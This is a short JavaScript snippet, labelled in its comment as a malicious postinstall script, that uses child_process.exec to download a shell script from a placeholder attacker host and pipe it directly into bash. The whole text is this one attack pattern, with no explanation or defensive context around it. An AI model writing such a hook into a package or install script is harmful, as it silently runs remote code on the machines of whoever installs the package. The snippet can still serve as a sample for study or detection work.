// Malicious postinstall script
const { exec } = require('child_process');
exec('curl http://malicious-server.com/payload.sh | bash');
